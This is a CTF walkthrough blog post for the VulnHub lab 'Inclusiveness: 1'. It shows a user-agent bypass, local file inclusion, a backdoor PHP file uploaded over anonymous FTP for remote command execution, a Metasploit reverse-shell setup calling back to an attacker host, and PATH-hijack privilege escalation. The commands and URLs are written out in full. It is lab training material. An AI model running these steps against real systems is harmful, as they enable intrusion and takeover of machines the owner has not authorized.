<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Inclusiveness: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/inclusiveness-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-12T17:22:14+00:00">March 12, 2020</time><time class="updated" datetime="2025-06-10T20:10:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Another walkthrough for the vulnhub machine “INCLUSIVENESS: 1” which is an Intermediate level lab designed by the author “h4sh5 &amp; Richard Lee” to give a taste to the OSCP Labs. The challenge is same just like any other CTF challenge where you identify the flag with the help of your pentest skill.</span></p>
<p><span style="color: #000000;">Download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/inclusiveness-1,422/">https://www.vulnhub.com/entry/inclusiveness-1,422/</a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;">Network Scanning</span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">nmap</span></li>
</ul>
<p><span style="color: #000000;">Enumeration</span></p>
<ul>
<li><span style="color: #000000;">txt</span></li>
<li><span style="color: #000000;">User-agent restriction bypass</span></li>
<li><span style="color: #000000;">LFI</span></li>
</ul>
<p><span style="color: #000000;">Exploiting LFI</span></p>
<ul>
<li><span style="color: #000000;">LFI To RCE</span></li>
</ul>
<p><span style="color: #000000;">Privilege Escalation</span></p>
<ul>
<li><span style="color: #000000;">Abusing PATH Variable</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walkthrough </u></strong></span></p>
<h3><span style="color: #000000;"><strong>Network Scanning </strong></span></h3>
<p><span style="color: #000000;">So, as we always start with netdiscover to get the IP of the VM machine and the IP of the host I’ve found is 192.168.29.151.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UWPgSQaRiyY/XmptHobFQ1I/AAAAAAAAi9c/dNABX78RRwIbFozZ_r3GCxBwXjYZqSvbwCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s proceed with network scan using Nmap aggressive scan as given below.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192168.29.151</pre>
<p><span style="color: #000000;">And as a result, we find that port 21 is open for FTP where anonymous login has been allowed and the directory name as /pub is writeable, and port 80 and 22 are also accessible for HTTP and SSH respectively.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sXQ5FEW_fc8/XmptLxp9DoI/AAAAAAAAi-M/qRycKtI6EJ8MCvipmqfUKbaLZo59DJZJwCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span> </strong></span></h3>
<p><span style="color: #000000;">To find any loopholes we need to list more, so we’re browsing the host IP in the web browser, but unfortunately, they were found only the “Apache2 Debian Default page.”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MLyu4h_bhr8/XmptMpfYwPI/AAAAAAAAi-U/ungNqhMWtTMnAmgssyCp3yTcjLc5b7-0gCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Instead we try to check for the robots.txt file and, as a result, the message “You are not a search engine!” is shown. You can’t read my robots.txt!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BqyRBQIjxRQ/XmptNAaBQII/AAAAAAAAi-c/tXNLnfWRW7AlqEGilvWj9zuJpHkG9u5fQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Without wasting time, I try to bypass this restriction by editing a new user agent in my firefox using the following steps:</span></p>
<ul>
<li><span style="color: #000000;">Inside the URL tab search for “<strong>about:config</strong>”</span></li>
<li><span style="color: #000000;">Then search for preference Name: <strong>useragnet</strong></span></li>
<li><span style="color: #000000;">Make a right click then &gt; <strong>New &gt; String</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5HXM58dZunU/XmptNCXqqEI/AAAAAAAAi-Y/kL90PcIftTYpXkRJzm3Re8t37IGJF8A_wCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">You get a dialog box; enter the preference name “general.useragent.overriide” as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KWMJMvasLEE/XmptNeSyZFI/AAAAAAAAi-g/zA40H5WvScEQZnG7J7zYKXjqDGivAbkuQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Enter the string value to provide useragent “GoogleBot”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Uz051ybE_3U/XmptOR9raVI/AAAAAAAAi-k/zT8BZEBNGUAc6FxVf_dpaOSJyD3BNYxQQCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Once the above steps have been completed, the record will be shown for your new edit preference.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GxEbV2ScS7U/XmptPD3JBkI/AAAAAAAAi-o/6-PytErPT_oF5B5lp0Xvqokt3cI0TfrfACLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now reload the URL for /robots.txt page and you will be able to read the disallowed entry as “/secret_informtion/” as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YxAE_IvJsLU/XmptHkfr82I/AAAAAAAAi9k/gwILMUXwHtsYAVWNarYRNhVJlf2ml9TAACLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">So, we’ve explored /secret_information, it brings a web page that describes “DNS Zone Transfer Attack” and the web page contains two hyperlinks “English &amp; Spanish.”</span></p>
<p><span style="color: #000000;">As I click on the “English” hyperlink, I found that it was calling the en.php via lang parameter in the URL, which means that there could be possibilities for LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4sPs1PaJdjw/XmptHs9rPrI/AAAAAAAAi9g/lD3eytqnTI8XRugNUq8he-DtPRVMfRiTQCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Therefore, I try to get /etc/passwd file by abusing the php include of the webpage and as result I got the whole contents of the /etc/passwd file as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dHTpaOhZ6TY/XmptInCPedI/AAAAAAAAi9o/KKUZF3ChQ3QPvYFBM2wJzJz8-IEwVr74gCLcBGAsYHQ/s1600/12.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting LFI</strong></span></h3>
<p><span style="color: #000000;">So, it was time to exploit the vulnerability of the LFI by injecting a malicious file and, as you know, the FTP service is available as anonymous and / pub is a writable directory.</span></p>
<p><span style="color: #000000;">We then try to read the “vsftpd.conf” FTP config file by abusing LFI to enumerate the writeable directory path.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zXtrN2HrkDc/XmptI1WUv3I/AAAAAAAAi9s/N6MCTXJvWvMX5AwioJtHh7ejyDvKUQZYACLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We’ve prepared a php file that contains a malicious code that will further trigger remote command execution vulnerabilities.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZxKLMTVJsZg/XmptI4u6mpI/AAAAAAAAi9w/FQQZLooorqoFGuO8idW9I_T3Znxj5U5uQCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now it’s time to upload the malicious file “backdoor.php” on the host machine via ftp, thus follow the below commands</span></p>
<pre class="lang:default decode:true">ftp 192.168.29.151
cd /pub
put backdoor.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-msZgbrsPbhU/XmptJoa9Q1I/AAAAAAAAi90/V-rNFYpszHgSkuUYYRZJYwAzoj3-5LRSQCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Further, we need to run the uploaded file to execute the malicious code by executing the following:</span></p>
<pre class="lang:default decode:true">http://192.168.29.151/secret_information/?/lang=var/ftp/pub/backdoor.php&amp;cmd=id</pre>
<p><span style="color: #000000;">Using the URL above, try to run the backdoor.php file and simultaneously run the OS command “Id” as shown in the image provided here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U8UVpcjg8rQ/XmptJ_sixFI/AAAAAAAAi98/Xewwb8FJd5MxGmMDKGB85BGe_KvejvgUgCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">As we have been successful in inducing RCE in the installed application by abusing LFI, we are continuing with Metasploit’s “web delivery” Module to compromise the host machine in order to obtain a reverse connection.</span></p>
<pre class="lang:default decode:true">use/exploit/multi/script/web_delivery
set target 1 &lt;php&gt;
set lhost 192.168.29.208
set payload php/meterpreter/reverse_tcp
exploit</pre>
<p><span style="color: #000000;">This will generate a malicious PHP code which you’ll use for execution on the web URL as done above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kB31rjMQPUE/XmptJ2WoKRI/AAAAAAAAi94/BjjaEvhLYDcxOaa1u-TCndARF2xbUvmuQCLcBGAsYHQ/s1600/17.1.png"/></span></p>
<p><span style="color: #000000;">So, I copied the above malicious code and paste it inside the URL to get the back connection of the host through the URL execution.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VDHpwEQPqKU/XmptKfQkJxI/AAAAAAAAi-A/KC0dxWPGLkwDZPfZNZSeNWaatkgVRAzpQCLcBGAsYHQ/s1600/17.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
<p><span style="color: #000000;">Booom!!! We hit the goal and obtain the meterperter session the host machine, since it was boot to root CTF, we need to escalate the root privilege shell, therefore we try to identify all programs or files that have SUID bits enabled.</span></p>
<p><span style="color: #000000;">So, with the help of find command, we’ve got a list of programs running as a superuser that unlocks the SUID bit where I notice /home/tom/rootshell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5hj0TWcqiYQ/XmptLMBVsKI/AAAAAAAAi-E/697rjBQ3PaswEZ5h8ZD2m0wbdkzqL8rmwCLcBGAsYHQ/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Inside /root/tom/ I found rootshell.c file and a compile file rootshell that owns SUID permissions.</span></p>
<p><span style="color: #000000;">According this piece of code if the file is executed as Tom user by calling the function for “whoami” program for validation then you will get a privilege shell else it will print user-ID that is currently logged in will be displayed.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2FyEl9loxUw/XmptLsPylOI/AAAAAAAAi-I/FfKFf0B6eUUz9FpBmMj6Mvh_BSdV9Q4RQCLcBGAsYHQ/s1600/19.png"/></span></p>
<p><span style="color: #000000;">In simple words the rootshell program give a high privilege shell if the output of whoami program will be “tom”.</span></p>
<p><span style="color: #000000;">You can easily take advantage of this configuration by abusing the PATH system. Here, we built a file as “whoami” in the / tmp directory, and write the following bash code to print “tom”</span></p>
<pre class="lang:default decode:true">cd /tmp
echo "printf "tom"" &gt; whoami
chmod 777 whoami</pre>
<p><span style="color: #000000;">Add a temporary path variable with the help of the following command. you will observe that we had added /tmp as PATH variable.</span></p>
<pre class="lang:default decode:true">export PATH=/tmp:$PATH
echo path</pre>
<p><span style="color: #000000;">when all is done then the rootshell to get the root privilege shell just we have obtained here as to shown below.</span></p>
<pre class="lang:default decode:true">cd /home/tom
./rootshell
cd /root
cat flag.txt</pre>
<p><span style="color: #000000;">Finally, we have found the root shell a flag.txt file, this lab has a good combination of basic vulnerability of Web and OS privilege Escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hjesq2ASRbQ/XmptL4sR4CI/AAAAAAAAi-Q/aVOgHG4SCBk95WVk1Dx5MpGXEVMwQTqEQCLcBGAsYHQ/s1600/20.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
